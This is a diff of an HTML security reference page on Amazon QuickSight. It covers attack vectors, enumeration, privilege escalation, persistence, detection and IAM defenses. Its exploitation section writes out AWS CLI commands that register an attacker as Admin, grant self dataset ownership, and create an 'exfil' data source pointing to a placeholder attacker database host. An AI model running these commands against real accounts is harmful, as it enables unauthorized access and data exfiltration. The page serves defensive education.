@@ -263,7 +263,7 @@
         <span class="header-title">Amazon QuickSight Security</span>
         <span class="header-badge">ANALYTICS</span>
       </div>
-      <p class="header-desc">Amazon QuickSight is a serverless, cloud-scale business intelligence (BI) service. Attackers target QuickSight to access visualized business data, exploit data source connections to reach backend databases, exfiltrate SPICE dataset contents, and abuse embedded dashboard URLs to leak sensitive analytics.</p>
+      <p class="header-desc">Amazon QuickSight is a serverless, cloud-scale business intelligence (BI) service. Attackers target QuickSight to access visualized business data, exploit data source connections to reach backend databases, exfiltrate SPICE dataset contents, and abuse embedded dashboard URLs to leak sensitive analytics to unauthorized parties.</p>
     </div>
   </div>
 </div>
@@ -272,10 +272,10 @@
 <div class="stats-row">
         <div class="stat-card">
           <div class="stat-value" style="color: #f87171;">HIGH</div>
-          <div class="stat-label">Data Exposure</div>
+          <div class="stat-label">Data Exposure Risk</div>
         </div>
         <div class="stat-card">
-          <div class="stat-value" style="color: #4ade80;">Per GB</div>
+          <div class="stat-value" style="color: #4ade80;">Per GB (see pricing page)</div>
           <div class="stat-label">SPICE Storage</div>
         </div>
         <div class="stat-card">
@@ -284,23 +284,27 @@
         </div>
         <div class="stat-card">
           <div class="stat-value" style="color: #c084fc;">Namespaces</div>
-          <div class="stat-label">Multi-Tenant</div>
+          <div class="stat-label">Multi-Tenant Isolation</div>
         </div></div>
 
 <!-- Overview -->
-<div class="section"><h2><span style="color:#f97316;">&#x1F4CB;</span> Service Overview</h2><div class="overview-grid">
+<div class="section"><h2><span style="color:#f97316;">📋</span> Service Overview</h2><div class="overview-grid">
         <div>
           <h4 style="color: #f97316;">Data Sources &amp; SPICE Datasets</h4>
-          <p>QuickSight connects to S3, Athena, RDS, Redshift, Aurora, OpenSearch, and on-prem databases. Data can be queried directly or imported into SPICE for in-memory performance.</p>
-          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Data source connections store credentials to access backend databases. Compromising QuickSight data source configs can reveal database connection strings and credential references.</div>
-        </div>
-        <div>
-          <h4 style="color: #f97316;">Dashboards, Embedding &amp; Users</h4>
-          <p>Dashboards can be shared or embedded in external applications via signed URLs. QuickSight manages its own user directory with Admin, Author, and Reader roles, separate from IAM.</p>
-          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> An attacker with IAM access to QuickSight API can register themselves as a QuickSight Admin, gaining full access to all dashboards and datasets.</div>
+          <p>QuickSight connects to a wide range of data sources including Amazon S3, Athena, RDS, Redshift, Aurora, OpenSearch Service, and on-premises databases via VPC connections. Data can be queried directly (Direct Query mode) or imported into SPICE (Super-fast, Parallel, In-memory Calculation Engine) for faster performance. SPICE datasets are encrypted at rest using AWS-managed keys by default, with optional customer-managed KMS keys (CMK).</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Data source connections store credentials (or use IAM roles) to access backend databases. Compromising QuickSight data source configurations can reveal database connection strings, usernames, and credential references in Secrets Manager. A single data source can expose an entire database.</div>
+        </div><div>
+          <h4 style="color: #f97316;">Dashboards, Analyses &amp; Embedding</h4>
+          <p>Dashboards are read-only snapshots of analyses that can be shared with users or embedded in external applications. Embedded dashboards use signed URLs or embedding SDKs with session tags. Analyses are the authoring environment where users build visualizations from datasets.</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> Embedded dashboard URLs, if leaked or generated with overly broad permissions, expose business intelligence data to unauthorized viewers. Anonymous embedding without proper row-level security exposes all data in the underlying dataset.</div>
+        </div><div>
+          <h4 style="color: #f97316;">Users, Groups &amp; Namespaces</h4>
+          <p>QuickSight manages its own user directory with three primary roles: Admin, Author, and Reader (plus Pro variants: Admin Pro, Author Pro, Reader Pro with Generative BI capabilities). Users can be federated via IAM, SAML, or OpenID Connect. Enterprise edition supports namespaces for multi-tenant isolation, logically separating users, groups, and assets. Groups control access to dashboards, analyses, and datasets.</p>
+          <div class="attack-note"><span style="color:#f97316;">Attack note:</span> QuickSight users are separate from IAM users. An attacker with IAM access to QuickSight API actions can register themselves as a QuickSight Admin, gaining full access to all dashboards and datasets in the account.</div>
         </div></div></div>
 
 <!-- Risk Assessment -->
+
 <div class="section">
   <h2>Security Risk Assessment</h2>
   <div class="risk-gauge">
@@ -315,17 +319,17 @@
       <div class="risk-score-label">Risk Score</div>
     </div>
   </div>
-  <p class="risk-desc">QuickSight aggregates data from multiple backend sources into a single analytics layer. Compromising it can expose summarized business data, reveal backend database connection details, and provide a pivot point to underlying data stores.</p>
+  <p class="risk-desc">QuickSight aggregates data from multiple backend sources into a single analytics layer. Compromising QuickSight access can expose summarized business data, reveal backend database connection details, and provide a pivot point to underlying data stores. Embedded dashboards extend the attack surface beyond AWS console access.</p>
 </div>
 
 <!-- Main Panels -->
 <div class="panels-grid">
       <div class="panel" style="border-color: #f8717133;">
-        <h3 style="color: #f87171;">&#x2694;&#xFE0F; Attack Vectors</h3><h4 style="color: #f87171;">Data Access Abuse</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Register as QuickSight Admin via API</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate all datasets and dashboards</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit data source connections for backend DB creds</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Export SPICE dataset contents</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse direct query mode for arbitrary queries</li></ul><h4 style="color: #f87171;">Embedding &amp; Sharing Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Generate embedded dashboard URLs for unauthorized access</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Intercept or reuse signed embedding URLs</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Share dashboards with overly broad permissions</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit anonymous embedding without RLS</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Create data sources pointing to attacker databases</li></ul></div>
+        <h3 style="color: #f87171;">⚔️ Attack Vectors</h3><h4 style="color: #f87171;">Data Access Abuse</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Register as QuickSight Admin via API to gain full access</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Enumerate and access all datasets and dashboards in the account</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit data source connections to discover backend database credentials</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Export SPICE dataset contents through dashboard or API access</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Abuse direct query mode to run queries against connected databases</li></ul><h4 style="color: #f87171;">Embedding &amp; Sharing Exploitation</h4><ul><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Generate embedded dashboard URLs for unauthorized access</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Intercept or reuse signed embedding URLs before expiry</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Share dashboards with overly broad permissions (all users/readers)</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Exploit anonymous embedding without row-level security</li><li><span class="bullet" style="color: #f87171;">&#x2022;</span> Create new data sources pointing to attacker-controlled databases</li></ul></div>
       <div class="panel" style="border-color: #fb923c33;">
-        <h3 style="color: #fb923c;">&#x26A0;&#xFE0F; Misconfigurations</h3><h4 style="color: #fb923c;">Access Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No row-level security (RLS) on shared datasets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No column-level security (CLS) on sensitive fields</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive dataset sharing (all Authors as Owners)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> QuickSight Admin role assigned unnecessarily</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IAM policies granting quicksight:* broadly</li></ul><h4 style="color: #fb923c;">Data Protection Gaps</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> SPICE encryption using only AWS-managed keys</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC connections not configured for private data sources</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Embedded dashboards without namespace isolation</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Data source credentials stored directly</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No IP restrictions on QuickSight access</li></ul></div>
+        <h3 style="color: #fb923c;">⚠️ Misconfigurations</h3><h4 style="color: #fb923c;">Access Issues</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No row-level security (RLS) on shared datasets</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No column-level security (CLS) on sensitive fields</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Overly permissive dataset sharing (all Authors as Owners)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> QuickSight Admin role assigned to users who do not need it</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> IAM policies granting quicksight:* to broad principals</li></ul><h4 style="color: #fb923c;">Data Protection Gaps</h4><ul><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> SPICE encryption using only AWS-managed keys (no CMK)</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> VPC connections not configured for private data sources</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Embedded dashboards without namespace isolation</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> Data source credentials stored directly instead of via Secrets Manager</li><li><span class="bullet" style="color: #fb923c;">&#x2022;</span> No IP restrictions on QuickSight access</li></ul></div>
       <div class="panel" style="border-color: #22d3ee33;">
-        <h3 style="color: #22d3ee;">&#x1F50D; Enumeration</h3><div class="cmd-block">
+        <h3 style="color: #22d3ee;">🔍 Enumeration</h3><div class="cmd-block">
           <div class="cmd-title">List All Dashboards</div>
           <pre><code>aws quicksight list-dashboards \
   --aws-account-id 123456789012</code></pre>
@@ -338,61 +342,109 @@
           <pre><code>aws quicksight list-data-sources \
   --aws-account-id 123456789012</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Describe Data Source (Connection Details)</div>
+          <div class="cmd-title">List QuickSight Users</div>
+          <pre><code>aws quicksight list-users \
+  --aws-account-id 123456789012 \
+  --namespace default</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List QuickSight Groups</div>
+          <pre><code>aws quicksight list-groups \
+  --aws-account-id 123456789012 \
+  --namespace default</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Describe a Data Source (Reveal Connection Details)</div>
           <pre><code>aws quicksight describe-data-source \
   --aws-account-id 123456789012 \
   --data-source-id my-data-source-id</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">List QuickSight Users</div>
-          <pre><code>aws quicksight list-users \
-  --aws-account-id 123456789012 --namespace default</code></pre>
+          <div class="cmd-title">Describe Dataset Permissions</div>
+          <pre><code>aws quicksight describe-data-set-permissions \
+  --aws-account-id 123456789012 \
+  --data-set-id my-data-set-id</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List SPICE Ingestion History</div>
+          <pre><code>aws quicksight list-ingestions \
+  --aws-account-id 123456789012 \
+  --data-set-id my-data-set-id</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">List Analyses</div>
+          <pre><code>aws quicksight list-analyses \
+  --aws-account-id 123456789012</code></pre>
         </div></div>
       <div class="panel" style="border-color: #c084fc33;">
-        <h3 style="color: #c084fc;">&#x1F4C8; Privilege Escalation</h3><h4 style="color: #c084fc;">QuickSight-Level Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Register as Admin via register-user with ADMIN role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Grant self Owner permissions on datasets</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create data source with attacker-controlled credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Share dashboards to attacker-controlled user</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Bypass RLS by accessing dataset as Owner</li></ul><h4 style="color: #c084fc;">Data-Level Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access data sources to discover DB connection params</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Pivot from QuickSight to backend RDS/Redshift</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create datasets from sensitive data sources</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Use direct query mode for arbitrary queries</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Owners bypass RLS -- this is by design</li></ul><div class="note"><strong>Key insight:</strong> Row-level security does NOT apply to dataset Owners. If an attacker gains Owner access, they see all rows regardless of RLS rules.</div></div>
+        <h3 style="color: #c084fc;">📈 Privilege Escalation</h3><h4 style="color: #c084fc;">QuickSight-Level Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Register as Admin via <code>register-user</code> with ADMIN role</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Update own user role from READER to ADMIN</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Grant self Owner permissions on datasets via <code>update-data-set-permissions</code></li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create new data source with attacker-controlled credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Share dashboards to attacker-controlled QuickSight user</li></ul><h4 style="color: #c084fc;">Data-Level Escalation</h4><ul><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Access data sources to discover database connection parameters</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Pivot from QuickSight to backend RDS/Redshift via exposed credentials</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Create datasets from sensitive data sources to extract data</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Use direct query mode to run arbitrary queries on connected databases</li><li><span class="bullet" style="color: #c084fc;">&#x2022;</span> Bypass RLS by accessing the dataset as an Owner (Owners see all data)</li></ul><div class="note"><strong>Key insight:</strong> Row-level security in QuickSight does NOT apply to dataset Owners. If an attacker gains Owner-level access to a dataset, they see all rows regardless of RLS rules. This is by design but frequently misunderstood.</div></div>
       <div class="panel" style="border-color: #facc1533;">
-        <h3 style="color: #facc15;">&#x1F517; Persistence</h3><h4 style="color: #facc15;">Account-Level</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Register hidden QuickSight user in non-default namespace</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create scheduled dataset refresh for ongoing access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add attacker group with access to key dashboards</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create exfiltration data source to attacker DB</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Save analyses querying sensitive datasets</li></ul><h4 style="color: #facc15;">Embedding-Based</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Repeatedly generate embedded URLs for ongoing access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create namespace with attacker-controlled users</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Register anonymous embedding configuration</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Leverage short-lived tokens (5-minute single-use)</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Maintain SPICE dataset access via scheduled refreshes</li></ul></div>
+        <h3 style="color: #facc15;">🔗 Persistence</h3><h4 style="color: #facc15;">Account-Level Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Register a hidden QuickSight user in a non-default namespace</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create a scheduled dataset refresh that maintains SPICE access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Add attacker-controlled group with access to key dashboards</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create a data source pointing to an attacker-controlled database for exfiltration</li></ul><h4 style="color: #facc15;">Embedding-Based Persistence</h4><ul><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Repeatedly generate short-lived embedded URLs (5-minute, single-use tokens) for ongoing access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Create a new namespace with attacker-controlled users</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Register an anonymous embedding configuration for ongoing access</li><li><span class="bullet" style="color: #facc15;">&#x2022;</span> Save analyses that query sensitive datasets for future use</li></ul><div class="note"><strong>Tool reference:</strong> CloudTrail logs QuickSight API calls including RegisterUser, CreateDataSource, UpdateDataSetPermissions, and GenerateEmbedUrlForAnonymousUser. Monitor these events for unauthorized access patterns.</div></div>
       <div class="panel" style="border-color: #4ade8033;">
-        <h3 style="color: #4ade80;">&#x1F6E1;&#xFE0F; Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RegisterUser - new QuickSight user registration</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateDataSource - new data source connection</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateDataSetPermissions - permission changes</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GenerateEmbedUrlForAnonymousUser - anon embedding</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeDataSource - credential reconnaissance</li></ul><h4 style="color: #4ade80;">Behavioral Indicators</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New Admin user registered via API</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Data source created pointing to unknown endpoints</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk dataset enumeration (multiple list calls)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Embedded URL generation from unexpected principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Permission grants to previously unknown users</li></ul></div></div>
+        <h3 style="color: #4ade80;">🛡️ Detection</h3><h4 style="color: #4ade80;">CloudTrail Events</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> RegisterUser (new QuickSight user registration)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> CreateDataSource (new data source connection)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> UpdateDataSetPermissions (permission changes)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> GenerateEmbedUrlForAnonymousUser (anonymous embedding)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> DescribeDataSource (credential reconnaissance)</li></ul><h4 style="color: #4ade80;">Behavioral Indicators</h4><ul><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> New QuickSight Admin user registered via API</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Data source created pointing to unknown endpoints</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Bulk dataset enumeration (multiple list-data-sets calls)</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Embedded URL generation from unexpected principals</li><li><span class="bullet" style="color: #4ade80;">&#x2022;</span> Permission grants to previously unknown users or groups</li></ul></div></div>
 
 <!-- Exploitation -->
-<div class="section"><h2><span style="color:#f87171;">&#x1F4BB;</span> Exploitation Commands</h2><div class="cmd-grid"><div class="cmd-block">
+<div class="section"><h2><span style="color:#f87171;">💻</span> Exploitation Commands</h2><div class="cmd-grid">
+        <div class="cmd-block">
           <div class="cmd-title">Register Attacker as QuickSight Admin</div>
           <pre><code>aws quicksight register-user \
   --aws-account-id 123456789012 \
-  --namespace default --identity-type IAM \
+  --namespace default \
+  --identity-type IAM \
   --iam-arn arn:aws:iam::123456789012:user/attacker \
-  --user-role ADMIN --email attacker@example.com</code></pre>
+  --user-role ADMIN \
+  --email attacker@example.com</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Describe Data Source to Extract Connection Info</div>
+          <pre><code>aws quicksight describe-data-source \
+  --aws-account-id 123456789012 \
+  --data-source-id target-ds-id</code></pre>
         </div><div class="cmd-block">
           <div class="cmd-title">Grant Self Owner Access to Dataset</div>
           <pre><code>aws quicksight update-data-set-permissions \
   --aws-account-id 123456789012 \
   --data-set-id target-dataset-id \
-  --grant-permissions Principal=ATTACKER_ARN,Actions=quicksight:DescribeDataSet,quicksight:UpdateDataSet</code></pre>
+  --grant-permissions Principal=arn:aws:quicksight:us-east-1:123456789012:user/default/attacker,Actions=quicksight:DescribeDataSet,quicksight:DescribeDataSetPermissions,quicksight:PassDataSet,quicksight:UpdateDataSet,quicksight:DeleteDataSet,quicksight:UpdateDataSetPermissions</code></pre>
         </div><div class="cmd-block">
-          <div class="cmd-title">Describe Data Source (Extract Connection Info)</div>
-          <pre><code>aws quicksight describe-data-source \
-  --aws-account-id 123456789012 \
-  --data-source-id target-ds-id</code></pre>
-        </div><div class="cmd-block">
-          <div class="cmd-title">Create Exfiltration Data Source</div>
+          <div class="cmd-title">Create Data Source to Attacker Database</div>
           <pre><code>aws quicksight create-data-source \
   --aws-account-id 123456789012 \
-  --data-source-id exfil --name exfil --type MYSQL \
-  --data-source-parameters '{"MySqlParameters":{"Host":"attacker-db.evil.com","Port":3306,"Database":"exfil"}}'</code></pre>
+  --data-source-id exfil-source \
+  --name exfil-source \
+  --type MYSQL \
+  --data-source-parameters '{&quot;MySqlParameters&quot;:{&quot;Host&quot;:&quot;attacker-db.example.com&quot;,&quot;Port&quot;:3306,&quot;Database&quot;:&quot;exfil&quot;}}' \
+  --credentials '{&quot;CredentialPair&quot;:{&quot;Username&quot;:&quot;exfil&quot;,&quot;Password&quot;:&quot;password&quot;}}'</code></pre>
+        </div><div class="cmd-block">
+          <div class="cmd-title">Enumerate All Dashboards and Their Details</div>
+          <pre><code>aws quicksight search-dashboards \
+  --aws-account-id 123456789012 \
+  --filters '[{&quot;Operator&quot;:&quot;StringEquals&quot;,&quot;Name&quot;:&quot;QUICKSIGHT_VIEWER_OR_OWNER&quot;,&quot;Value&quot;:&quot;arn:aws:quicksight:us-east-1:123456789012:user/default/attacker&quot;}]'</code></pre>
         </div></div></div>
 
 <!-- Policies -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F4DC;</span> Policy Examples</h2><div class="policy-grid"><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+<div class="section"><h2><span style="color:#4ade80;">📜</span> Policy Examples</h2><div class="policy-grid">
+        <div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
           <div class="policy-header">
             <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
             <span style="color: #f87171; font-weight: 600;">Dangerous - Full QuickSight Access</span>
           </div>
           <pre><code>{
   &quot;Effect&quot;: &quot;Allow&quot;,
-  &quot;Action&quot;: &quot;quicksight:*&quot;,
+  &quot;Action&quot;: [
+    &quot;quicksight:*&quot;
+  ],
   &quot;Resource&quot;: &quot;*&quot;
 }</code></pre>
-          <p class="policy-desc">Full access allows user registration as Admin, data source creation, dataset export, and embedded URL generation</p>
+          <p class="policy-desc">Full QuickSight access allows user registration as Admin, data source creation, dataset export, and embedded URL generation</p>
+        </div><div class="policy-card" style="border-color: #ef444433; background: rgba(239,68,68,0.05);">
+          <div class="policy-header">
+            <span style="color: #f87171; font-size: 1.2em;">&#x2717;</span>
+            <span style="color: #f87171; font-weight: 600;">Dangerous - User Registration Without Restriction</span>
+          </div>
+          <pre><code>{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;quicksight:RegisterUser&quot;,
+    &quot;quicksight:CreateGroupMembership&quot;
+  ],
+  &quot;Resource&quot;: &quot;*&quot;
+}</code></pre>
+          <p class="policy-desc">Allows registering new QuickSight users with any role (including ADMIN) and adding them to any group</p>
         </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
           <div class="policy-header">
             <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
@@ -405,77 +457,117 @@
     &quot;quicksight:ListDashboards&quot;,
     &quot;quicksight:GetDashboardEmbedUrl&quot;
   ],
-  &quot;Resource&quot;: &quot;arn:aws:quicksight:*:*:dashboard/*&quot;
+  &quot;Resource&quot;: &quot;arn:aws:quicksight:*:123456789012:dashboard/*&quot;,
+  &quot;Condition&quot;: {
+    &quot;StringEquals&quot;: {
+      &quot;aws:PrincipalTag/Department&quot;: &quot;analytics&quot;
+    }
+  }
 }</code></pre>
-          <p class="policy-desc">Scoped to dashboard-only access without data source or dataset modification</p>
+          <p class="policy-desc">Scoped to dashboard-only access with tag-based condition restricting to analytics department</p>
         </div><div class="policy-card" style="border-color: #22c55e33; background: rgba(34,197,94,0.05);">
           <div class="policy-header">
             <span style="color: #4ade80; font-size: 1.2em;">&#x2713;</span>
-            <span style="color: #4ade80; font-weight: 600;">Secure - Deny User Registration</span>
+            <span style="color: #4ade80; font-weight: 600;">Secure - Namespace-Isolated Author</span>
           </div>
           <pre><code>{
-  &quot;Effect&quot;: &quot;Deny&quot;,
-  &quot;Action&quot;: &quot;quicksight:RegisterUser&quot;,
-  &quot;Resource&quot;: &quot;*&quot;
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Action&quot;: [
+    &quot;quicksight:CreateDataSet&quot;,
+    &quot;quicksight:DescribeDataSet&quot;,
+    &quot;quicksight:PassDataSource&quot;,
+    &quot;quicksight:CreateAnalysis&quot;,
+    &quot;quicksight:DescribeAnalysis&quot;
+  ],
+  &quot;Resource&quot;: [
+    &quot;arn:aws:quicksight:*:123456789012:dataset/*&quot;,
+    &quot;arn:aws:quicksight:*:123456789012:datasource/approved-*&quot;,
+    &quot;arn:aws:quicksight:*:123456789012:analysis/*&quot;
+  ]
 }</code></pre>
-          <p class="policy-desc">Prevents unauthorized QuickSight user registration (especially ADMIN role)</p>
+          <p class="policy-desc">Author limited to approved data sources only, preventing creation of rogue data source connections</p>
         </div></div></div>
 
 <!-- Defenses -->
-<div class="section"><h2><span style="color:#4ade80;">&#x1F6E1;&#xFE0F;</span> Defense Recommendations</h2><div class="defense-grid"><div class="defense-card">
+<div class="section"><h2><span style="color:#4ade80;">🛡️</span> Defense Recommendations</h2><div class="defense-grid">
+        <div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F512;</span>
+            <span class="defense-icon">🔒</span>
             <div>
               <h4>Enable Row-Level and Column-Level Security</h4>
-              <p>Apply RLS on all shared datasets and CLS to hide sensitive columns. Enterprise edition required. Owners bypass RLS.</p>
+              <p>Apply RLS on all shared datasets to ensure users only see authorized data. Apply CLS to hide sensitive columns from unauthorized users. Available in Enterprise edition only.</p>
+              <pre><code>Enterprise Edition required
+RLS: Permission dataset or tag-based rules
+CLS: Restrict columns per user/group
+Owners bypass RLS — minimize Owner grants</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F511;</span>
+            <span class="defense-icon">🔐</span>
             <div>
               <h4>Use Customer-Managed Keys for SPICE</h4>
-              <p>Enable CMK encryption for SPICE datasets via the QuickSight console under SPICE encryption settings.</p>
+              <p>Enable CMK encryption for SPICE datasets to maintain control over encryption keys and the ability to revoke access instantly. CMK encryption for SPICE is configured through the QuickSight console or via the <code>quicksight:UpdateKeyRegistration</code> IAM permission-only action, not through the CLI <code>update-account-settings</code> command. Refer to the QuickSight console under &quot;Manage QuickSight&quot; &gt; &quot;SPICE encryption&quot; to enable CMK.</p>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F310;</span>
+            <span class="defense-icon">🌐</span>
             <div>
-              <h4>Configure VPC Connections for Private Sources</h4>
-              <p>Use VPC connections to access private data sources without traversing the public internet.</p>
+              <h4>Configure VPC Connections for Private Data Sources</h4>
+              <p>Use VPC connections to ensure QuickSight accesses private data sources without traversing the public internet. Use PrivateLink for QuickSight API access.</p>
+              <pre><code>VPC connection: ENIs in your VPC subnets
+Security groups control QuickSight traffic
+PrivateLink: Interface VPC endpoint for API</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F464;</span>
+            <span class="defense-icon">👤</span>
             <div>
               <h4>Restrict User Registration</h4>
-              <p>Deny quicksight:RegisterUser for non-admin principals. Monitor RegisterUser CloudTrail events.</p>
+              <p>Use IAM policies to prevent unauthorized QuickSight user registration. Deny quicksight:RegisterUser for non-admin principals. Monitor RegisterUser CloudTrail events.</p>
+              <pre><code>{
+  &quot;Effect&quot;: &quot;Deny&quot;,
+  &quot;Action&quot;: &quot;quicksight:RegisterUser&quot;,
+  &quot;Resource&quot;: &quot;*&quot;,
+  &quot;Condition&quot;: {
+    &quot;StringNotEquals&quot;: {
+      &quot;aws:PrincipalArn&quot;: &quot;arn:aws:iam::123456789012:role/QuickSightAdmin&quot;
+    }
+  }
+}</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F510;</span>
+            <span class="defense-icon">🔑</span>
             <div>
-              <h4>Use Secrets Manager for Data Source Creds</h4>
-              <p>Store database credentials in Secrets Manager rather than directly in QuickSight data source configurations.</p>
+              <h4>Use Secrets Manager for Data Source Credentials</h4>
+              <p>Store database credentials in AWS Secrets Manager rather than directly in QuickSight data source configurations. This enables credential rotation and audit logging.</p>
+              <pre><code>Data source credential pair: Avoid
+Secrets Manager ARN: Preferred
+IAM role-based access: Best for AWS sources</code></pre>
             </div>
           </div>
         </div><div class="defense-card">
           <div class="defense-header">
-            <span class="defense-icon">&#x1F4CA;</span>
+            <span class="defense-icon">📊</span>
             <div>
               <h4>Monitor with CloudTrail</h4>
-              <p>Alert on RegisterUser (especially ADMIN), CreateDataSource, UpdateDataSetPermissions, and GenerateEmbedUrlForAnonymousUser.</p>
+              <p>Enable CloudTrail logging for all QuickSight API calls. Alert on high-risk events: RegisterUser, CreateDataSource, UpdateDataSetPermissions, and GenerateEmbedUrlForAnonymousUser.</p>
+              <pre><code>Key events to monitor:
